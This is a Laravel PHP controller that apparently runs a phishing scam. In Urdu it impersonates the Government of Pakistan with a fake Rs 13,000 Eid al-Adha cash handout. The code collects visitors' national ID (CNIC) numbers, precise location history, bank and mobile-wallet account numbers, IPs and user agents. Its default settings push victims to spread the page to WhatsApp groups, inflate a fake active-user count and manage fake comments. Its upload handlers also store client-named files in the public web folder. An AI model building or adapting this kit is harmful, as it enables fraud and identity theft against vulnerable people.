<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\EidTohfaSetting;
use App\Models\EidTohfaComment;
use App\Models\EidTohfaNotification;
use App\Models\EidTohfaImage;
use App\Models\EidTohfaLead;
use App\Models\AdminSettings;
use Illuminate\Support\Facades\Validator;

class EidTohfaController extends Controller
{
    public function __construct(AdminSettings $settings)
    {
        $this->settings = $settings::first();
    }

    public function index()
    {
        $eidSettings = EidTohfaSetting::orderBy('group')->orderBy('key')->get()->groupBy('group');
        $comments = EidTohfaComment::orderBy('order')->get();
        $notifications = EidTohfaNotification::orderBy('order')->get();
        $images = EidTohfaImage::orderBy('type')->orderBy('order')->get();
        $leads = EidTohfaLead::latest()->get();
        
        return view('admin.eid-tohfa.index', compact('eidSettings', 'comments', 'notifications', 'images', 'leads'));
    }

    public function edit()
    {
        $eidSettings = EidTohfaSetting::orderBy('group')->orderBy('key')->get()->groupBy('group');
        return view('admin.eid-tohfa.edit', compact('eidSettings'));
    }

    public function update(Request $request)
    {
        $data = $request->except('_token', '_method');
        
        // Handle file uploads for image fields
        $imageFields = ['header_image', 'favicon_url', 'og_image', 'twitter_image'];
        
        foreach ($imageFields as $field) {
            if ($request->hasFile($field . '_file')) {
                $file = $request->file($field . '_file');
                $filename = time() . '_' . $field . '.' . $file->getClientOriginalExtension();
                $file->move(public_path('uploads/eid-tohfa'), $filename);
                $data[$field] = 'uploads/eid-tohfa/' . $filename;
            }
        }
        
        foreach ($data as $key => $value) {
            // Skip file upload fields
            if (strpos($key, '_file') !== false) {
                continue;
            }
            
            $setting = EidTohfaSetting::where('key', $key)->first();
            if ($setting) {
                $setting->value = $value;
                $setting->save();
            }
        }

        return redirect()->route('eid-tohfa.index')->with('success', 'Settings updated successfully!');
    }

    public function create()
    {
        return view('admin.eid-tohfa.create');
    }

    public function store(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'key' => 'required|unique:eid_tohfa_settings,key',
            'value' => 'required',
            'type' => 'required',
            'group' => 'required',
        ]);

        if ($validator->fails()) {
            return back()->withErrors($validator)->withInput();
        }

        EidTohfaSetting::create($request->all());

        return redirect()->route('eid-tohfa.index')->with('success', 'Setting created successfully!');
    }

    public function destroy($id)
    {
        $setting = EidTohfaSetting::findOrFail($id);
        $setting->delete();

        return redirect()->route('eid-tohfa.index')->with('success', 'Setting deleted successfully!');
    }

    public function initializeDefaults()
    {
        $defaults = [
            // General Settings
            ['key' => 'page_title', 'value' => 'روپے 13,000 عید الاضحی کیش ٹرانسفر', 'type' => 'text', 'group' => 'general', 'description' => 'Page Title'],
            ['key' => 'marquee_text', 'value' => 'سخاوت کا ایک مہینہ - وفاقی حکومت پاکستان 13,000 روپے نقد امداد', 'type' => 'text', 'group' => 'general', 'description' => 'Marquee Text'],
            ['key' => 'amount', 'value' => '13000', 'type' => 'number', 'group' => 'general', 'description' => 'Cash Amount'],
            
            // Images
            ['key' => 'header_image', 'value' => 'https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgxa178dRR01NSycZx-4fda5IxQg_hUzasADvLTQnZf0SkoYNtuy3a5MlreBXQkHLsbQ1a4YoZk4_TXN0hevgbq1mL77mntb2skVmfwQoFX63ytmcVG6RPSg0loFJ24rKOFPBtZbpkMicTl-sU_c1pd4Pu2diwmJRoOEEwTKJfkj7lKoURUa5Y910YtyMk/s1080/IMG_4757.jpeg', 'type' => 'url', 'group' => 'images', 'description' => 'Header Banner Image'],
            
            // Content
            ['key' => 'intro_badge', 'value' => 'روپے 13,000 عید الاضحی کیش ٹرانسفر', 'type' => 'text', 'group' => 'content', 'description' => 'Intro Badge Text'],
            ['key' => 'intro_text', 'value' => 'انسانی ہمدردی کی رسائی کے حصے کے طور پر، <b>وفاقی حکومت پاکستان </b> روپے فراہم کر رہا ہے۔ عید الاضحی خوشی اور آسانی کے ساتھ منانے کے لیے تمام پاکستانیوں کے لیے 13,000 نقد امداد۔ ہر خاندان کو روپے ملیں گے۔ اس سال کے جشن میں 13,000', 'type' => 'textarea', 'group' => 'content', 'description' => 'Intro Description'],
            ['key' => 'button_text', 'value' => 'ابھی حاصل کریں۔', 'type' => 'text', 'group' => 'content', 'description' => 'Main Button Text'],
            ['key' => 'note_text', 'value' => 'جاری رکھنے کے لیے ابھی دعوی کرنے کے لیے آگے بڑھیں۔', 'type' => 'text', 'group' => 'content', 'description' => 'Note Text'],
            
            // Form
            ['key' => 'form_title', 'value' => 'اپنا اکاؤنٹ نمبر درج کریں:', 'type' => 'text', 'group' => 'content', 'description' => 'Form Title'],
            ['key' => 'form_placeholder', 'value' => 'اکاؤنٹ نمبر درج کریں۔', 'type' => 'text', 'group' => 'content', 'description' => 'Input Placeholder'],
            ['key' => 'submit_button', 'value' => 'بھیجیں۔', 'type' => 'text', 'group' => 'content', 'description' => 'Submit Button Text'],
            ['key' => 'error_message', 'value' => 'براہ کرم ایک درست اکاؤنٹ نمبر درج کریں!', 'type' => 'text', 'group' => 'content', 'description' => 'Error Message'],
            ['key' => 'eligibility_button_text', 'value' => 'اپنی اہلیت چیک کریں', 'type' => 'text', 'group' => 'content', 'description' => 'Eligibility Button Text'],
            ['key' => 'eligibility_intro_text', 'value' => 'درخواست مکمل کرنے سے پہلے اپنی اہلیت کی تصدیق کریں۔', 'type' => 'text', 'group' => 'content', 'description' => 'Eligibility Intro Text'],
            ['key' => 'cnic_title', 'value' => 'اپنا شناختی کارڈ نمبر درج کریں', 'type' => 'text', 'group' => 'content', 'description' => 'CNIC Form Title'],
            ['key' => 'cnic_placeholder', 'value' => '13 ہندسوں کا CNIC نمبر', 'type' => 'text', 'group' => 'content', 'description' => 'CNIC Input Placeholder'],
            ['key' => 'cnic_submit_button', 'value' => 'جمع کریں', 'type' => 'text', 'group' => 'content', 'description' => 'CNIC Submit Button Text'],
            ['key' => 'cnic_error_message', 'value' => 'براہ کرم 13 ہندسوں کا درست شناختی کارڈ نمبر درج کریں۔', 'type' => 'text', 'group' => 'content', 'description' => 'CNIC Error Message'],
            ['key' => 'location_title', 'value' => 'اپنی لوکیشن کی اجازت دیں', 'type' => 'text', 'group' => 'content', 'description' => 'Location Consent Title'],
            ['key' => 'location_consent_text', 'value' => 'اہلیت کی تصدیق کے لیے آپ کی موجودہ لوکیشن درکار ہے۔ اجازت کے بغیر آپ آگے نہیں بڑھ سکتے۔', 'type' => 'textarea', 'group' => 'content', 'description' => 'Location Consent Text'],
            ['key' => 'location_allow_button', 'value' => 'لوکیشن کی اجازت دیں', 'type' => 'text', 'group' => 'content', 'description' => 'Location Allow Button Text'],
            ['key' => 'location_deny_button', 'value' => 'اجازت نہیں دینی', 'type' => 'text', 'group' => 'content', 'description' => 'Location Deny Button Text'],
            ['key' => 'location_denied_message', 'value' => 'لوکیشن کی اجازت کے بغیر درخواست آگے نہیں بڑھ سکتی۔', 'type' => 'text', 'group' => 'content', 'description' => 'Location Denied Message'],
            ['key' => 'location_saved_message', 'value' => 'لوکیشن محفوظ ہو گئی۔', 'type' => 'text', 'group' => 'content', 'description' => 'Location Saved Message'],
            ['key' => 'eligible_title', 'value' => 'مبارک ہو! آپ اہل ہیں', 'type' => 'text', 'group' => 'content', 'description' => 'Eligible Account Form Title'],
            ['key' => 'bank_select_label', 'value' => 'ادائیگی کا طریقہ منتخب کریں', 'type' => 'text', 'group' => 'content', 'description' => 'Bank Select Label'],
            ['key' => 'bank_options', 'value' => "JazzCash\nEasyPaisa\nBank Transfer", 'type' => 'textarea', 'group' => 'content', 'description' => 'Bank Options (one per line)'],
            
            // Share Section
            ['key' => 'share_instruction_1', 'value' => 'اسے واٹس ایپ پر 5 گروپس یا 15 دوستوں کے ساتھ شیئر کریں (نیچے "SHARE" آئیکن پر کلک کریں)۔', 'type' => 'textarea', 'group' => 'content', 'description' => 'Share Instruction 1'],
            ['key' => 'share_instruction_2', 'value' => 'GREEN تصدیقی بار پُر ہونے کے بعد آپ کو خود بخود ہمارے ادائیگی کے صفحے پر بھیج دیا جائے گا۔', 'type' => 'textarea', 'group' => 'content', 'description' => 'Share Instruction 2'],
            ['key' => 'share_instruction_3', 'value' => 'آپ کو بذریعہ ایس ایم ایس تصدیق موصول ہوگی۔', 'type' => 'text', 'group' => 'content', 'description' => 'Share Instruction 3'],
            ['key' => 'share_button', 'value' => 'شیئر کریں۔', 'type' => 'text', 'group' => 'content', 'description' => 'Share Button Text'],
            
            // Links
            ['key' => 'payment_link', 'value' => 'https://crn77.com/4/8525379', 'type' => 'url', 'group' => 'links', 'description' => 'Payment/Redirect Link'],
            ['key' => 'whatsapp_share_text', 'value' => '*وفاقی حکومت روپے تمام پاکستانیوں کو 13,000 عیدالاضحی کیش کی منتقلی*', 'type' => 'textarea', 'group' => 'links', 'description' => 'WhatsApp Share Message'],
            
            // Active Users
            ['key' => 'active_users_initial', 'value' => '98542', 'type' => 'number', 'group' => 'general', 'description' => 'Initial Active Users Count'],
            ['key' => 'active_users_text', 'value' => 'Pakistan Users Currently Applying', 'type' => 'text', 'group' => 'content', 'description' => 'Active Users Text'],
            
            // SEO Settings
            ['key' => 'meta_description', 'value' => 'روپے 13,000 عید الاضحی کیش ٹرانسفر - وفاقی حکومت پاکستان کی طرف سے تمام پاکستانیوں کے لیے نقد امداد', 'type' => 'textarea', 'group' => 'seo', 'description' => 'Meta Description'],
            ['key' => 'meta_keywords', 'value' => 'عید الاضحی, کیش ٹرانسفر, پاکستان, 13000 روپے, نقد امداد', 'type' => 'text', 'group' => 'seo', 'description' => 'Meta Keywords'],
            ['key' => 'meta_author', 'value' => 'Government of Pakistan', 'type' => 'text', 'group' => 'seo', 'description' => 'Meta Author'],
            ['key' => 'favicon_url', 'value' => 'img/favicon-1759599656.png', 'type' => 'text', 'group' => 'seo', 'description' => 'Favicon Path/URL'],
            
            // OpenGraph Settings
            ['key' => 'og_title', 'value' => 'روپے 13,000 عید الاضحی کیش ٹرانسفر', 'type' => 'text', 'group' => 'seo', 'description' => 'OG Title'],
            ['key' => 'og_description', 'value' => 'روپے 13,000 عید الاضحی کیش ٹرانسفر', 'type' => 'textarea', 'group' => 'seo', 'description' => 'OG Description'],
            ['key' => 'og_image', 'value' => 'img/favicon-1759599656.png', 'type' => 'text', 'group' => 'seo', 'description' => 'OG Image Path/URL'],
            ['key' => 'og_url', 'value' => 'https://www.mechaniitid.site/rs13000-eid-al-adha-cash-transfer', 'type' => 'url', 'group' => 'seo', 'description' => 'OG URL'],
            ['key' => 'og_type', 'value' => 'website', 'type' => 'text', 'group' => 'seo', 'description' => 'OG Type'],
            ['key' => 'og_site_name', 'value' => 'Eid Al-Adha Cash Transfer', 'type' => 'text', 'group' => 'seo', 'description' => 'OG Site Name'],
            
            // Twitter Card Settings
            ['key' => 'twitter_card', 'value' => 'summary_large_image', 'type' => 'text', 'group' => 'seo', 'description' => 'Twitter Card Type'],
            ['key' => 'twitter_title', 'value' => 'روپے 13,000 عید الاضحی کیش ٹرانسفر', 'type' => 'text', 'group' => 'seo', 'description' => 'Twitter Title'],
            ['key' => 'twitter_description', 'value' => 'روپے 13,000 عید الاضحی کیش ٹرانسفر', 'type' => 'textarea', 'group' => 'seo', 'description' => 'Twitter Description'],
            ['key' => 'twitter_image', 'value' => 'img/favicon-1759599656.png', 'type' => 'text', 'group' => 'seo', 'description' => 'Twitter Image Path/URL'],
        ];

        foreach ($defaults as $default) {
            EidTohfaSetting::updateOrCreate(
                ['key' => $default['key']],
                $default
            );
        }

        return redirect()->route('eid-tohfa.index')->with('success', 'Default settings initialized successfully!');
    }

    // ========== COMMENTS CRUD ==========
    public function storeFrontendComment(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'user_name' => 'required|string|max:60',
            'comment_text' => 'required|string|max:500',
        ]);

        if ($validator->fails()) {
            return response()->json([
                'success' => false,
                'errors' => $validator->errors(),
            ], 422);
        }

        $comment = EidTohfaComment::create([
            'user_name' => trim($request->user_name),
            'avatar_url' => null,
            'comment_text' => trim($request->comment_text),
            'time_ago' => 'Just now',
            'is_liked' => false,
            'is_reply' => false,
            'order' => (int) EidTohfaComment::max('order') + 1,
            'status' => true,
        ]);

        return response()->json([
            'success' => true,
            'comment' => [
                'user_name' => $comment->user_name,
                'comment_text' => $comment->comment_text,
                'time_ago' => $comment->time_ago,
                'avatar_url' => 'https://ui-avatars.com/api/?name=' . urlencode($comment->user_name) . '&background=0B7A3B&color=fff&size=64',
            ],
        ]);
    }

    public function trackFirstVisit(Request $request)
    {
        $lead = EidTohfaLead::create([
            'first_visit_ip' => $request->ip(),
            'first_visit_at' => now(),
            'user_agent' => substr((string) $request->userAgent(), 0, 1000),
            'status' => 'visited',
        ]);

        return response()->json([
            'success' => true,
            'lead_id' => $lead->id,
        ]);
    }

    public function storeFrontendLead(Request $request)
    {
        $step = $request->input('step', 'cnic');
        
        $rules = [
            'lead_id' => 'nullable|integer|exists:eid_tohfa_leads,id',
            'step' => 'required|in:cnic,location,bank',
            'cnic' => 'nullable|digits:13',
        ];
        
        if ($step === 'cnic') {
            $leadId = $request->input('lead_id');
            $rules['cnic'] = 'required|digits:13|unique:eid_tohfa_leads,cnic' . ($leadId ? ',' . $leadId : '');
        }
        
        if ($step === 'location') {
            $rules['latitude'] = 'required|numeric|between:-90,90';
            $rules['longitude'] = 'required|numeric|between:-180,180';
            $rules['accuracy'] = 'nullable|numeric|min:0';
            $rules['location_captured_at'] = 'nullable|date';
        }
        
        if ($step === 'bank') {
            $rules['bank_name'] = 'nullable|string|max:100';
            $rules['account_number'] = 'nullable|string|max:100';
        }

        $validator = Validator::make($request->all(), $rules);

        if ($validator->fails()) {
            return response()->json([
                'success' => false,
                'errors' => $validator->errors(),
            ], 422);
        }

        $statusMap = [
            'cnic' => 'cnic_submitted',
            'location' => 'location_captured',
            'bank' => 'completed',
        ];

        $payload = [
            'cnic' => $request->cnic,
            'ip_address' => $request->ip(),
            'user_agent' => substr((string) $request->userAgent(), 0, 1000),
            'status' => $statusMap[$step],
        ];

        if ($step === 'location' || $request->filled('latitude')) {
            $payload['latitude'] = $request->latitude;
            $payload['longitude'] = $request->longitude;
            $payload['accuracy'] = $request->accuracy;
            $payload['location_captured_at'] = $request->filled('location_captured_at')
                ? \Carbon\Carbon::parse($request->location_captured_at)
                : now();
        }

        if ($step === 'bank' || $request->filled('bank_name')) {
            $payload['bank_name'] = $request->bank_name;
            $payload['account_number'] = $request->account_number;
        }

        if ($request->filled('lead_id')) {
            $lead = EidTohfaLead::findOrFail($request->lead_id);
            
            if (isset($payload['latitude']) && $lead->latitude) {
                $history = $lead->location_history ? json_decode($lead->location_history, true) : [];
                $history[] = [
                    'latitude' => $lead->latitude,
                    'longitude' => $lead->longitude,
                    'accuracy' => $lead->accuracy,
                    'location_captured_at' => $lead->location_captured_at ? (string) $lead->location_captured_at : null,
                ];
                $payload['location_history'] = json_encode($history);
            }
            
            $lead->update($payload);
        } else {
            $lead = EidTohfaLead::create($payload);
        }

        return response()->json([
            'success' => true,
            'lead_id' => $lead->id,
            'status' => $lead->status,
        ]);
    }

    public function storeComment(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'user_name' => 'required',
            'comment_text' => 'required',
        ]);

        if ($validator->fails()) {
            return back()->withErrors($validator)->withInput();
        }

        EidTohfaComment::create($request->all());
        return redirect()->route('eid-tohfa.index')->with('success', 'Comment added successfully!')->with('active_tab', 'comments');
    }

    public function updateComment(Request $request, $id)
    {
        $comment = EidTohfaComment::findOrFail($id);
        $comment->update($request->all());
        return redirect()->route('eid-tohfa.index')->with('success', 'Comment updated successfully!')->with('active_tab', 'comments');
    }

    public function destroyComment($id)
    {
        EidTohfaComment::findOrFail($id)->delete();
        return redirect()->route('eid-tohfa.index')->with('success', 'Comment deleted successfully!')->with('active_tab', 'comments');
    }

    // ========== NOTIFICATIONS CRUD ==========
    public function storeNotification(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'message' => 'required',
        ]);

        if ($validator->fails()) {
            return back()->withErrors($validator)->withInput();
        }

        EidTohfaNotification::create($request->all());
        return redirect()->route('eid-tohfa.index')->with('success', 'Notification added successfully!')->with('active_tab', 'notifications');
    }

    public function updateNotification(Request $request, $id)
    {
        $notification = EidTohfaNotification::findOrFail($id);
        $notification->update($request->all());
        return redirect()->route('eid-tohfa.index')->with('success', 'Notification updated successfully!')->with('active_tab', 'notifications');
    }

    public function destroyNotification($id)
    {
        EidTohfaNotification::findOrFail($id)->delete();
        return redirect()->route('eid-tohfa.index')->with('success', 'Notification deleted successfully!')->with('active_tab', 'notifications');
    }

    // ========== IMAGES CRUD ==========
    public function storeImage(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'title' => 'required',
            'type' => 'required',
        ]);

        if ($validator->fails()) {
            return back()->withErrors($validator)->withInput();
        }

        $data = $request->all();
        
        // Handle file upload
        if ($request->hasFile('image_file')) {
            $file = $request->file('image_file');
            $filename = time() . '_' . $file->getClientOriginalName();
            $file->move(public_path('uploads/eid-tohfa'), $filename);
            $data['image_url'] = 'uploads/eid-tohfa/' . $filename;
        } elseif (!$request->image_url) {
            return back()->withErrors(['image_url' => 'Please provide either an image URL or upload a file'])->withInput();
        }

        EidTohfaImage::create($data);
        return redirect()->route('eid-tohfa.index')->with('success', 'Image added successfully!')->with('active_tab', 'images');
    }

    public function updateImage(Request $request, $id)
    {
        $image = EidTohfaImage::findOrFail($id);
        $data = $request->all();
        
        // Handle file upload
        if ($request->hasFile('image_file')) {
            $file = $request->file('image_file');
            $filename = time() . '_' . $file->getClientOriginalName();
            $file->move(public_path('uploads/eid-tohfa'), $filename);
            $data['image_url'] = 'uploads/eid-tohfa/' . $filename;
        }
        
        $image->update($data);
        return redirect()->route('eid-tohfa.index')->with('success', 'Image updated successfully!')->with('active_tab', 'images');
    }

    public function destroyImage($id)
    {
        EidTohfaImage::findOrFail($id)->delete();
        return redirect()->route('eid-tohfa.index')->with('success', 'Image deleted successfully!')->with('active_tab', 'images');
    }
}
